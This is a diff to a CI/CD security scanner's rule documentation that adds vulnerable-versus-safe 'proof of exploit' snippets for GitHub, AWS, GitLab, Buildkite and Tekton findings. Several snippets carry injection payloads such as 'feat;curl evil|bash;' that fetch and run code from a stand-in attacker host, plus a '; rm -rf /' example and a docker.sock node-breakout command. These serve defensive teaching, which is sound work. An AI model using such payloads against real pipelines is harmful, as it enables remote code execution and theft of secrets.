+  ],
+  "wait_timer": 5
+}
+```
 
 **Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).
 
@@ -9878,6 +16545,39 @@ If the receiving service genuinely cannot handle HTTPS or shared secrets, termin
 
 - Long-running pattern of webhook payloads leaking via plain-HTTP receivers (Zapier, IFTTT, custom legacy endpoints) — the GitHub repo's commit-diff content, pull-request body, and secret-scanning alert payloads all land on the wire unencrypted. Public catalogs of compromised internal webhooks document the receiver-side breach where the URL alone was enough to inject forged events when no shared secret was configured.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the webhook ships events over plaintext
+# HTTP and carries no shared secret. Any network attacker
+# between GitHub and the receiver sniffs the event
+# payload (PR titles, commit messages, sometimes file
+# contents) and can also forge requests at the receiver
+# since no HMAC validation is possible.
+# GET /repos/myorg/myrepo/hooks/12345:
+{
+  "config": {
+    "url": "http://webhook.example.com/gh",
+    "content_type": "json",
+    "insecure_ssl": "1",
+    "secret": ""
+  }
+}
+
+# Safe: HTTPS endpoint, TLS verification on, and a
+# shared HMAC secret the receiver validates against
+# the ``X-Hub-Signature-256`` header on every delivery.
+# PATCH /repos/myorg/myrepo/hooks/12345:
+{
+  "config": {
+    "url": "https://webhook.example.com/gh",
+    "content_type": "json",
+    "insecure_ssl": "0",
+    "secret": "<32-byte-random>"
+  }
+}
+```
+
 **Source:** [`SCM-026`](../providers/scm.md#scm-026) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-027`: Outside collaborator holds write / maintain / admin access <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-027 }
@@ -9897,6 +16597,33 @@ Requires admin scope on the repo to enumerate the outside-collaborator list; wit
 **Seen in the wild.**
 
 - Long-running pattern across compromise postmortems: a former contributor's outside-collaborator entry retains ``push`` access years after the engagement ended. The account is then taken over (often by credential stuffing or a leaked PAT), and the attacker pushes a tampered commit that lands without review because the access level itself is the gate.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: an outside collaborator (a contractor, a
+# departed employee whose access wasn't fully revoked,
+# a security-researcher allowed in for a one-off audit)
+# carries ``write`` / ``maintain`` / ``admin`` on the
+# repo. The blast radius of their account compromise
+# is the same as an internal maintainer's.
+# GET /repos/myorg/myrepo/collaborators?affiliation=outside:
+[
+  {
+    "login": "contractor-alice",
+    "role_name": "write"
+  }
+]
+
+# Safe: outside collaborators carry ``read`` or ``triage``
+# only. If they need to land code, route through fork +
+# PR + internal-reviewer approval. Re-run access reviews
+# quarterly and revoke on engagement end.
+# PUT /repos/myorg/myrepo/collaborators/contractor-alice:
+{
+  "permission": "read"
+}
+```
 
 **Source:** [`SCM-027`](../providers/scm.md#scm-027) in the [SCM provider](../providers/scm.md).
 
@@ -9951,6 +16678,37 @@ Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-en
 
 - Some orgs grant ``always`` bypass to a tightly-scoped automation team for after-hours emergency response. The right pattern is a GitHub App with auditable triggering (PagerDuty, Slack); ``always`` bypass for a human team leaves no record of the override. Suppress on the specific ruleset id with a calendar-bound rationale that names the audit channel and the next promotion review.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the repo ruleset names a bypass actor with
+# ``bypass_mode: always``. That actor (typically the
+# ``github-actions[bot]`` or an internal automation
+# account) skips every rule the ruleset enforces, on
+# every push, without any audit signal. A compromised
+# bot identity lands any change into ``main``.
+# GET /repos/myorg/myrepo/rulesets/123:
+{
+  "name": "main-protection",
+  "bypass_actors": [
+    {"actor_id": 5, "actor_type": "Integration",
+     "bypass_mode": "always"}
+  ]
+}
+
+# Safe: ``bypass_mode: pull_request`` (the bot can open
+# its own bypass-eligible PR but must still pass review)
+# or remove the bypass actor entirely.
+# PUT /repos/myorg/myrepo/rulesets/123:
+{
+  "name": "main-protection",
+  "bypass_actors": [
+    {"actor_id": 5, "actor_type": "Integration",
+     "bypass_mode": "pull_request"}
+  ]
+}
+```
+
 **Source:** [`SCM-030`](../providers/scm.md#scm-030) in the [SCM provider](../providers/scm.md).
 
 ### `SCM-031`: Repo allows auto-merge (no human-timing gate) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-031 }
@@ -9984,6 +16742,45 @@ SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-prote
 **Known false positives.**
 
 - Some rulesets are deliberately scoped to enforce only non-PR-review controls (e.g., a ``commit_message_pattern`` ruleset for changelog compliance, or a ``tag_name_pattern`` ruleset for release tagging). The right pattern is to ALSO have a separate ruleset that enforces PR reviews on the same refs; SCM-032 fires when the *combination* leaves a gap. Suppress on the specific ruleset id with a rationale that names the PR-review channel (separate ruleset or legacy branch protection).
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the ruleset is enforced (governance theater
+# checks pass) but doesn't include a ``pull_request``
+# rule. Pushes to ``main`` still require a PR (via
+# ``deletion`` / ``non_fast_forward`` rules), but the PR
+# itself doesn't need any review. A single author
+# self-merges into production.
+# GET /repos/myorg/myrepo/rulesets/123:
+{
+  "name": "main-protection",
+  "enforcement": "active",
+  "rules": [
+    {"type": "deletion"},
+    {"type": "non_fast_forward"}
+  ]
+}
+
+# Safe: add a ``pull_request`` rule with at least one
+# required reviewer. Pair with ``dismiss_stale_reviews_
+# on_push: true`` so a re-push invalidates the approval
+# and forces a fresh review.
+# PUT /repos/myorg/myrepo/rulesets/123:
+{
+  "name": "main-protection",
+  "enforcement": "active",
+  "rules": [
+    {"type": "deletion"},
+    {"type": "non_fast_forward"},
+    {"type": "pull_request",
+     "parameters": {
+       "required_approving_review_count": 1,
+       "dismiss_stale_reviews_on_push": true
+     }}
+  ]
+}
+```
 
 **Source:** [`SCM-032`](../providers/scm.md#scm-032) in the [SCM provider](../providers/scm.md).
 
@@ -10229,6 +17026,39 @@ Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE mer
 
 **Recommendation.** Rotate the signing profile: create a replacement and update every code-signing config that references the revoked profile. A revoked or canceled profile invalidates every signature it produced, lambdas relying on it will fail verification.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: AWS Signer profile is revoked or
+# inactive. Code-signing pipelines that route through
+# this profile silently fail (or fall back to
+# unsigned artifacts if the gate is permissive); the
+# unsigned artifacts then deploy without integrity
+# verification.
+import boto3
+signer = boto3.client('signer')
+signer.get_signing_profile(profileName='prod-lambda-signer')
+# {'status': 'Revoked', 'statusReason': 'compromise suspected'}
+
+# Safe: investigate the revocation, rotate to a new
+# profile if compromise is confirmed, or restore the
+# original if revoked in error. Either way, the
+# downstream pipeline reference (CodeSigningConfig on
+# Lambdas) must be updated to point at the active
+# profile so signed deploys resume.
+new_prof = signer.put_signing_profile(
+    profileName='prod-lambda-signer-v2',
+    platformId='AWSLambda-SHA384-ECDSA',
+)
+lambdacli = boto3.client('lambda')
+lambdacli.update_code_signing_config(
+    CodeSigningConfigArn='arn:aws:lambda:us-east-1:123:code-signing-config:csc-...',
+    AllowedPublishers={
+        'SigningProfileVersionArns': [new_prof['profileVersionArn']]
+    },
+)
+```
+
 **Source:** [`SIGN-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `SM-000`: Secrets Manager API access failed <span class="pg-sev pg-sev--info">INFO</span> { #detail-sm-000 }
@@ -10249,6 +17079,30 @@ Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE mer
 
 **Recommendation.** Enable automatic rotation on every Secrets Manager secret referenced by a CodeBuild project or CodePipeline. Unrotated secrets persist indefinitely, so a single leak (e.g. a build log that echoed the value) compromises the secret for its full lifetime.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a Secrets Manager secret with no rotation
+# configured. The credential lives forever; any leak
+# (log echo, accidental commit, .env file in an artifact)
+# stays valid until manually rotated, which usually means
+# until someone notices.
+import boto3
+sm = boto3.client('secretsmanager')
+sm.describe_secret(SecretId='prod/db-master')
+# {'RotationEnabled': False, ...}
+
+# Safe: enable rotation against a rotation Lambda. AWS
+# provides templates for RDS / DocumentDB / Redshift
+# rotation; custom secrets need a Lambda that knows how
+# to rotate the credential.
+sm.rotate_secret(
+    SecretId='prod/db-master',
+    RotationLambdaARN='arn:aws:lambda:us-east-1:123:function:rotate-rds',
+    RotationRules={'AutomaticallyAfterDays': 30},
+)
+```
+
 **Source:** [`SM-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
 ### `SM-002`: Secrets Manager resource policy allows wildcard principal <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-sm-002 }
@@ -10258,6 +17112,35 @@ Pair with SCM-033 (required status checks). SCM-033 ensures CI passes BEFORE mer
 **How this is detected.** A wildcard-principal Allow on a Secrets Manager resource policy means any principal in any AWS account can call ``GetSecretValue`` (subject to conditions, if any). Always combine with at least ``aws:SourceAccount`` or ``aws:PrincipalOrgID``, the lift-and-shift cross-account secret-access pattern needs scoping.
 
 **Recommendation.** Remove Allow statements whose Principal is ``*`` from every Secrets Manager resource policy, or scope them with a ``Condition`` restricting the source account/org (``aws:PrincipalOrgID``). A wildcard-principal policy allows any AWS account to call ``GetSecretValue`` on the secret.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: Secrets Manager resource policy with
+# ``Principal: '*'``. Anyone (no auth required) can
+# call GetSecretValue. Equivalent to publishing the
+# credential on GitHub.
+import boto3, json
+sm = boto3.client('secretsmanager')
+sm.put_resource_policy(
+    SecretId='prod/db-master',
+    ResourcePolicy=json.dumps({
+        'Version': '2012-10-17',
+        'Statement': [{
+            'Effect': 'Allow',
+            'Principal': '*',
+            'Action': 'secretsmanager:GetSecretValue',
+            'Resource': '*'
+        }]
+    }),
+)
+
+# Safe: remove the public policy. Resource policies
+# should be a defense-in-depth layer over IAM, not a
+# replacement. Scope ``Principal`` to specific roles
+# (or rely on IAM alone and skip the resource policy).
+sm.delete_resource_policy(SecretId='prod/db-master')
+```
 
 **Source:** [`SM-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).
 
@@ -10337,6 +17220,46 @@ v1 limitations: only same-job step outputs are tracked; ``jobs.<id>.outputs.*`` 
 
 - If the producer step deliberately runs a sanitiser between the interpolation and the ``$GITHUB_OUTPUT`` write (``echo "$TITLE" | tr -dc 'a-zA-Z0-9 ' >> $GITHUB_OUTPUT``), the consumer is no longer exploitable. The rule's regex doesn't model that transformation and will still fire; suppress via ignore-file scoped to the consumer step name when this is the deliberate shape. The producer's GHA-003 finding then carries the residual signal that the sanitiser is load-bearing.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a producer step writes
+# ``$GITHUB_OUTPUT`` from an untrusted source
+# (``github.event.issue.title`` / ``github.head_ref``);
+# a later step interpolates the step output into a
+# shell command. The interpolation lets injected
+# metacharacters in the title execute as separate shell
+# commands in the consumer step.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - id: extract
+        run: |
+          echo "title=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
+      - run: ./generate-notes --title ${{ steps.extract.outputs.title }}
+
+# Safe: sanitise the untrusted value at the producer
+# step BEFORE it lands in $GITHUB_OUTPUT. The canonical
+# pattern is to pull the source into an env var, strip
+# unsafe chars with a known-good filter, and only then
+# write the sanitised value. The consumer step uses an
+# env-var indirection with shell quoting.
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - id: extract
+        env:
+          RAW_TITLE: ${{ github.event.issue.title }}
+        run: |
+          clean=$(echo "$RAW_TITLE" | tr -dc 'a-zA-Z0-9 -')
+          echo "title=$clean" >> "$GITHUB_OUTPUT"
+      - env:
+          TITLE: ${{ steps.extract.outputs.title }}
+        run: ./generate-notes --title "$TITLE"
+```
+
 **Source:** [`TAINT-001`](../providers/github.md#taint-001) in the [GitHub Actions provider](../providers/github.md).
 
 ### `TAINT-002`: Untrusted input flows across jobs via ``jobs.<id>.outputs:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-002 }
@@ -10358,6 +17281,51 @@ Same-step interpolations (the producer's own use of ``${{ github.event.* }}`` in
 
 - Sanitisation between the source interpolation and the $GITHUB_OUTPUT write isn't modeled. If the producer step runs ``echo "$TITLE" | tr -dc 'a-zA-Z0-9 '`` before redirecting to GITHUB_OUTPUT, the consumer is no longer exploitable but TAINT-002 will still fire; suppress via ignore-file scoped to the consumer job's workflow file when this is the deliberate shape.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an ``extract`` job exposes an untrusted
+# value via ``jobs.extract.outputs:`` and a downstream
+# job consumes it via ``needs.extract.outputs.title``
+# directly in a shell command. The cross-job hop is
+# usually invisible during PR review because the
+# producer and consumer live in different YAML blocks.
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    outputs:
+      title: ${{ steps.x.outputs.title }}
+    steps:
+      - id: x
+        run: echo "title=${{ github.event.issue.title }}" >> "$GITHUB_OUTPUT"
+  use:
+    needs: extract
+    runs-on: ubuntu-latest
+    steps:
+      - run: ./generate-notes --title ${{ needs.extract.outputs.title }}
+
+# Safe: sanitise at the producer + quote at the consumer
+# via env-var indirection, same shape as TAINT-001 but
+# across the jobs boundary.
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    outputs:
+      title: ${{ steps.x.outputs.title }}
+    steps:
+      - id: x
+        env: { RAW: ${{ github.event.issue.title }} }
+        run: |
+          clean=$(echo "$RAW" | tr -dc 'a-zA-Z0-9 -')
+          echo "title=$clean" >> "$GITHUB_OUTPUT"
+  use:
+    needs: extract
+    runs-on: ubuntu-latest
+    steps:
+      - env: { TITLE: ${{ needs.extract.outputs.title }} }
+        run: ./generate-notes --title "$TITLE"
+```
+
 **Source:** [`TAINT-002`](../providers/github.md#taint-002) in the [GitHub Actions provider](../providers/github.md).
 
 ### `TAINT-003`: Untrusted input forwarded into reusable workflow ``with:`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-003 }
@@ -10373,6 +17341,54 @@ When the callee body is loaded into the same scan (local ``./.github/workflows/<
 **Known false positives.**
 
 - Callees that wrap the input safely (immediately copy into env, sanitise before use) make the caller-side forward harmless. When the callee body is loaded into the scan, the rule downgrades to MEDIUM confidence on those paths; suppress via ignore-file when the callee's handling is audited and sound. Without ``--resolve-remote`` the rule can't see remote callee bodies and every forward stays at MEDIUM, the right default for unverifiable cross-repo flow.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the caller workflow passes an untrusted
+# value into a reusable workflow's ``with:`` inputs. The
+# reusable workflow inlines the input into a shell
+# command without quoting; the injection lands in the
+# reusable workflow's runtime even though the caller
+# carries the dangerous source.
+# caller.yml
+on: [issues]
+jobs:
+  call:
+    uses: myorg/repo/.github/workflows/reusable.yml@<sha>
+    with:
+      title: ${{ github.event.issue.title }}
+# reusable.yml
+on:
+  workflow_call:
+    inputs:
+      title: { required: true, type: string }
+jobs:
+  use:
+    runs-on: ubuntu-latest
+    steps: [{ run: "./gen --title ${{ inputs.title }}" }]
+
+# Safe: sanitise the untrusted value at the caller
+# BEFORE forwarding it into ``with:``. The reusable
+# workflow can also defensively re-quote inside its own
+# step body via env-var indirection.
+# caller.yml
+on: [issues]
+jobs:
+  clean:
+    runs-on: ubuntu-latest
+    outputs: { title: ${{ steps.s.outputs.title }} }
+    steps:
+      - id: s
+        env: { RAW: ${{ github.event.issue.title }} }
+        run: |
+          clean=$(echo "$RAW" | tr -dc 'a-zA-Z0-9 -')
+          echo "title=$clean" >> "$GITHUB_OUTPUT"
+  call:
+    needs: clean
+    uses: myorg/repo/.github/workflows/reusable.yml@<sha>
+    with: { title: ${{ needs.clean.outputs.title }} }
+```
 
 **Source:** [`TAINT-003`](../providers/github.md#taint-003) in the [GitHub Actions provider](../providers/github.md).
 
@@ -10390,6 +17406,43 @@ v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``inclu
 
 - If the producer job runs a sanitiser between the tainted source interpolation and the dotenv write (``echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 ' > taint.env``), the consumer is no longer exploitable but TAINT-004 still fires. Suppress via ignore-file scoped to the consumer job's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an ``extract`` job writes an untrusted
+# source (``$CI_COMMIT_MESSAGE``) into a dotenv report
+# artifact. GitLab automatically loads dotenv reports
+# as env vars in dependent jobs; the consumer job then
+# inlines the value into a shell command unquoted, and
+# any metacharacters in the source execute there.
+extract:
+  script:
+    - echo "MSG=$CI_COMMIT_MESSAGE" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message $MSG
+
+# Safe: sanitise at the producer before writing the
+# dotenv file, and quote at the consumer. The cleaned
+# value is safe to inline; the consumer's env binding
+# is properly quoted.
+extract:
+  script:
+    - clean=$(echo "$CI_COMMIT_MESSAGE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "MSG=$clean" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message "$MSG"
+```
+
 **Source:** [`TAINT-004`](../providers/gitlab.md#taint-004) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `TAINT-005`: Untrusted input flows across steps via ``buildkite-agent meta-data`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-005 }
@@ -10406,6 +17459,45 @@ Buildkite meta-data is per-build, not per-step; any step in the same build can r
 
 - If the producer step runs a sanitiser between the tainted source interpolation and the ``meta-data set`` call (``echo "$BUILDKITE_PULL_REQUEST_TITLE" | tr -dc 'a-zA-Z0-9 ' | xargs -I{} buildkite-agent meta-data set title {}``), the consumer is no longer exploitable but TAINT-005 still fires. Suppress via ignore-file scoped to the consumer step's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a PR titled ``shiny new feature";curl
+# evil.com|bash;"`` lands in the meta-data store via the
+# producer step. The consumer step reads it back into
+# ``$TITLE`` and inlines it into a shell command — the
+# injected ``curl`` runs in the consumer's shell with
+# the consumer step's full secret set in scope.
+steps:
+  - label: extract
+    command: |
+      buildkite-agent meta-data set "title" \
+        "$BUILDKITE_PULL_REQUEST_TITLE"
+  - wait
+  - label: use
+    command: |
+      TITLE=$(buildkite-agent meta-data get title)
+      echo $TITLE
+      ./generate-release-notes.sh --title $TITLE
+
+# Safe: sanitise at the producer (drop anything outside
+# the expected charset) and quote at the consumer. The
+# value is now safe to inline into a shell command — the
+# injected metacharacters either never reach meta-data or
+# are quoted as one literal argument.
+steps:
+  - label: extract
+    command: |
+      clean=$(echo "$BUILDKITE_PULL_REQUEST_TITLE" | \
+          tr -dc 'a-zA-Z0-9 -')
+      buildkite-agent meta-data set "title" "$clean"
+  - wait
+  - label: use
+    command: |
+      TITLE="$(buildkite-agent meta-data get title)"
+      ./generate-release-notes.sh --title "$TITLE"
+```
+
 **Source:** [`TAINT-005`](../providers/buildkite.md#taint-005) in the [Buildkite provider](../providers/buildkite.md).
 
 ### `TAINT-006`: Untrusted input flows across tasks via Tekton ``results`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-006 }
@@ -10421,6 +17513,66 @@ Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { n
 **Known false positives.**
 
 - If the producer task runs a sanitiser between the tainted ``$(params.X)`` interpolation and the ``$(results.Y.path)`` write, the consumer is no longer exploitable but TAINT-006 still fires. Suppress via ignore-file scoped to the consumer task name when this is the deliberate shape; the sanitiser is then load-bearing.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: Task ``extract`` writes the PR title to a
+# Tekton ``result``; Task ``use`` reads it back and
+# inlines it into a shell command. A PipelineRun whose
+# upstream provides ``feat;curl evil|bash;`` for the
+# title lands the metacharacters in ``use``'s shell.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  params:
+    - name: pr-title
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            script: |
+              echo -n "$(params.title)" > $(results.clean-title.path)
+      params:
+        - { name: title, value: $(params.pr-title) }
+    - name: use
+      runAfter: [extract]
+      taskSpec:
+        params: [{ name: title }]
+        steps:
+          - name: use
+            image: alpine@sha256:abc123...
+            script: |
+              ./gen-notes --title $(params.title)
+      params:
+        - { name: title, value: $(tasks.extract.results.clean-title) }
+
+# Safe: sanitise at the producer Task (strip metacharacters
+# to an expected charset) before writing the result, and
+# bind the consumer's param to a shell env var that's
+# quoted on every use. The injected ``;`` / backticks
+# either never reach the result or are quoted away.
+apiVersion: tekton.dev/v1
+kind: Pipeline
+spec:
+  tasks:
+    - name: extract
+      taskSpec:
+        params: [{ name: title }]
+        results: [{ name: clean-title }]
+        steps:
+          - name: extract
+            image: alpine@sha256:abc123...
+            env:
+              - { name: RAW, value: $(params.title) }
+            script: |
+              echo -n "$RAW" | tr -dc 'a-zA-Z0-9 -' \
+                > $(results.clean-title.path)
+```
 
 **Source:** [`TAINT-006`](../providers/tekton.md#taint-006) in the [Tekton provider](../providers/tekton.md).
 
@@ -10533,6 +17685,41 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 **Known false positives.**
 
 - If the consuming job sanitises the inherited variable before referencing it (``CLEAN=$(echo "$TITLE" | tr -dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still fires on the original ``$TITLE`` reference even though the sanitised value is what reaches the shell. Suppress via ignore-file scoped to the consuming job's name when the sanitiser is audited and load-bearing.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: hidden template ``.base`` interpolates
+# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
+# title) into a ``variables:`` block. Job ``build``
+# extends ``.base`` and references ``$TITLE`` unquoted
+# in a shell command. A MR titled ``feat;curl
+# evil|bash;`` executes the injected curl. GL-002
+# misses this because it skips hidden-job templates.
+.base:
+  variables:
+    TITLE: $CI_COMMIT_TITLE
+build:
+  extends: .base
+  script:
+    - echo Building $TITLE
+    - ./generate-notes --title $TITLE
+
+# Safe: receive the source value at the consumer (not
+# the template), sanitise it once, and reference the
+# cleaned variable quoted from then on. The hidden
+# template no longer carries any attacker-controllable
+# variable.
+.base:
+  before_script:
+    - echo "Job $CI_JOB_NAME starting"
+build:
+  extends: .base
+  script:
+    - clean=$(echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "Building $clean"
+    - ./generate-notes --title "$clean"
+```
 
 **Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -10705,6 +17892,35 @@ resource "aws_route_table_association" "build" {
 
 **Recommendation.** Pin every step image to a content-addressable digest (``gcr.io/tekton-releases/git-init@sha256:<digest>``). Tag-only references (``alpine:3.18``) and rolling tags (``alpine:latest``) let a compromised registry update redirect the step at the next pull, with no audit trail in the Task manifest.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``ubuntu:22.04`` is a mutable tag. Whoever
+# controls the registry can repoint it on the next 22.04.x
+# refresh; the next TaskRun pulls the swap silently.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu:22.04
+      script: |
+        make build
+
+# Safe: pin to the immutable sha256 digest. The leading
+# comment documents which tag the digest corresponds to.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build }
+spec:
+  steps:
+    - name: compile
+      image: ubuntu@sha256:abc123...  # ubuntu:22.04, refreshed YYYY-MM-DD
+      script: |
+        make build
+```
+
 **Source:** [`TKN-001`](../providers/tekton.md#tkn-001) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-002`: Tekton step runs privileged or as root <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tkn-002 }
@@ -10714,6 +17930,42 @@ resource "aws_route_table_association" "build" {
 **How this is detected.** Detection fires on a step with ``securityContext.privileged: true``, ``securityContext.runAsUser: 0``, ``securityContext.runAsNonRoot: false``, ``securityContext.allowPrivilegeEscalation: true``, or no ``securityContext`` block at all.
 
 **Recommendation.** Set ``securityContext.privileged: false``, ``runAsNonRoot: true``, and ``allowPrivilegeEscalation: false`` on every step. A privileged step shares the node's kernel namespaces; a malicious or compromised step image then has root on the build node, breaking the boundary between build and cluster.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``securityContext.privileged: true`` gives
+# the step container full kernel-namespace access on the
+# node. A workload compromise becomes a node-level shell
+# with reach into every other pod on the node.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: builder@sha256:abc123...
+      securityContext:
+        privileged: true
+
+# Safe: explicit non-root + privilege-escalation off,
+# all caps dropped, read-only root filesystem. The step
+# cannot bind a privileged port or modify its own image
+# layer at runtime.
+apiVersion: tekton.dev/v1
+kind: Task
+spec:
+  steps:
+    - name: build
+      image: builder@sha256:abc123...
+      securityContext:
+        privileged: false
+        allowPrivilegeEscalation: false
+        runAsNonRoot: true
+        runAsUser: 10001
+        readOnlyRootFilesystem: true
+        capabilities:
+          drop: ["ALL"]
+```
 
 **Source:** [`TKN-002`](../providers/tekton.md#tkn-002) in the [Tekton provider](../providers/tekton.md).
 
@@ -10725,6 +17977,48 @@ resource "aws_route_table_association" "build" {
 
 **Recommendation.** Don't interpolate ``$(params.<name>)`` directly into the step ``script:``. Tekton substitutes the value before the shell parses it, so a parameter containing ``; rm -rf /`` runs as shell. Receive the parameter through ``env:`` (``valueFrom: ...`` or ``value: $(params.<name>)``) and reference the env var quoted in the script (``"$NAME"``); or pass it as a positional argument to a shell function.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``$(params.revision)`` is substituted into
+# the script literally before the shell parses it. A
+# PipelineRun whose ``revision`` param is
+# ``main";curl evil|bash;"`` executes the injected curl
+# in the step's shell context.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: clone }
+spec:
+  params:
+    - name: revision
+      type: string
+  steps:
+    - name: clone
+      image: alpine/git@sha256:abc123...
+      script: |
+        git clone https://github.com/org/repo --branch $(params.revision)
+
+# Safe: bind the param to a shell variable via ``env`` and
+# quote it on every use. Tekton expands ``$(params.*)`` at
+# template time; shell quoting defends only at the shell
+# layer, so the indirection through env is what matters.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: clone }
+spec:
+  params:
+    - name: revision
+      type: string
+  steps:
+    - name: clone
+      image: alpine/git@sha256:abc123...
+      env:
+        - name: REVISION
+          value: $(params.revision)
+      script: |
+        git clone https://github.com/org/repo --branch "$REVISION"
+```
+
 **Source:** [`TKN-003`](../providers/tekton.md#tkn-003) in the [Tekton provider](../providers/tekton.md).
 
 ### `TKN-004`: Tekton Task mounts hostPath or shares host namespaces <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-tkn-004 }
@@ -10734,6 +18028,44 @@ resource "aws_route_table_association" "build" {
 **How this is detected.** Checks ``spec.volumes[].hostPath`` (legacy v1beta1 form), ``spec.workspaces[].volumeClaimTemplate.spec.storageClassName == 'hostpath'``, and ``spec.podTemplate`` host-namespace flags.
 
 **Recommendation.** Use Tekton ``workspaces:`` backed by ``emptyDir`` or ``persistentVolumeClaim`` instead of ``hostPath``. Drop ``hostNetwork: true`` / ``hostPID: true`` / ``hostIPC: true`` on the Task's ``podTemplate``. A hostPath mount of ``/var/run/docker.sock`` or ``/`` lets the build break out of the pod and act as the underlying node.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: mounting ``/var/run/docker.sock`` into a
+# step gives the Task root access to the node's Docker
+# API. ``docker run --privileged -v /:/host`` from inside
+# the step then owns the entire node — kubelet creds,
+# every other pod's filesystem.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build-image }
+spec:
+  volumes:
+    - name: docker-sock
+      hostPath: { path: /var/run/docker.sock }
+  steps:
+    - name: build
+      image: docker:24
+      volumeMounts:
+        - { name: docker-sock, mountPath: /var/run/docker.sock }
+      script: |
+        docker build -t app .
+
+# Safe: Kaniko sandboxed build in an emptyDir workspace.
+# No node-level access, no host-path mount.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: build-image }
+spec:
+  volumes:
+    - name: scratch
+      emptyDir: {}
+  steps:
+    - name: build
+      image: gcr.io/kaniko-project/executor@sha256:abc123...
+      args: [--context=., --destination=registry/app:tag]
+```
 
 **Source:** [`TKN-004`](../providers/tekton.md#tkn-004) in the [Tekton provider](../providers/tekton.md).
 
@@ -10746,6 +18078,47 @@ resource "aws_route_table_association" "build" {
 **Recommendation.** Mount secrets via ``env.valueFrom.secretKeyRef`` (or a ``volumes:`` Secret mount) instead of writing the value into ``env.value`` or ``params[].default``. Task manifests are committed to git and cluster-readable; literal values leak through normal access paths.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: the AWS access key literal lives in the
+# Task manifest. ``kubectl get task -o yaml`` exposes it;
+# the manifest is committed to git for any repo reader.
+apiVersion: tekton.dev/v1
+kind: Task
+metadata: { name: upload }
+spec:
+  steps:
+    - name: upload
+      image: aws-cli@sha256:abc123...
+      env:
+        - name: AWS_ACCESS_KEY_ID
+          value: AKIAIOSFODNN7EXAMPLE
+        - name: AWS_SECRET_ACCESS_KEY
+          value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+      script: aws s3 cp ./build s3://bucket/
+
+# Safe: reference a Kubernetes Secret via
+# ``valueFrom.secretKeyRef``. The Task manifest carries
+# the secret's name, not its value; the value lives in
+# the cluster's Secret store and can rotate without a
+# Task change.
